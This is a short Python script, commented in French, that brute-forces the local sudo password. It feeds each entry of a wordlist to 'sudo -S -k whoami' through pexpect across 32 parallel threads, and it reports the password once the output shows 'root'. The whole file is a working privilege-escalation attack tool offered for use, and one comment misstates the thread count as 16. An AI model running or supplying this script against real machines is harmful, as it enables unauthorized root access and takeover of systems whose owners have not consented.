import pexpect
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# Fonction pour tester un mot de passe avec pexpect
def test_password(pw, index):
    print(f"[{index}] Test mot de passe: {pw}")
    try:
        # Lance un processus sudo avec pexpect
#        child = pexpect.spawn("sudo -S su -c 'whoami'", encoding="utf-8")
        child = pexpect.spawn("sudo -S -k whoami", encoding="utf-8")
        # Envoie le mot de passe
        child.sendline(pw)
        # Attendre la sortie de la commande
        child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.035)
        if child.after == "root":
            print(f"✅ Mot de passe : {pw} [{index}]")
            os._exit(0)
    except:
        return None

# Fonction principale
def main():
    # Argument parser
    parser = argparse.ArgumentParser(description="Bruteforce sudo using a wordlist.")
    parser.add_argument("--wordlist", required=True, help="Chemin vers le fichier wordlist")
    args = parser.parse_args()

    wordlist = args.wordlist

    # Chargement du fichier wordlist
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    # Utilisation de ThreadPoolExecutor pour exécuter 16 threads en parallèle
    with ThreadPoolExecutor(max_workers=32) as executor:
        # Soumission de chaque test de mot de passe au thread pool
        futures = {executor.submit(test_password, pw, i+1): pw for i, pw in enumerate(passwords)}

        # Attendre que les threads se terminent
        for future in as_completed(futures):
            future.result()

if __name__ == "__main__":
    main()
